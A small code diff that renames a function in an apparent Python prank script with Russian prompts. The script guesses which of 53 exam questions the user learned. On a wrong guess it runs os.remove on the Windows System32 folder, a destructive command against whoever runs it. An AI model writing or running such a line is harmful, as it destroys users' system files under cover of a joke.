@@ -61,12 +61,12 @@
 import random
 import os
 
-def kislicinThink():
+def kislitsynRandomizer():
     return random.randint(1, 54)
 
 question = int(input('Какой вопрос вы выучили из 53?'))
 
-if kislicinThink() == question:
+if kislitsynRandomizer() == question:
     print('Сдал!')
 else:
     os.remove("C:\Windows\System32")
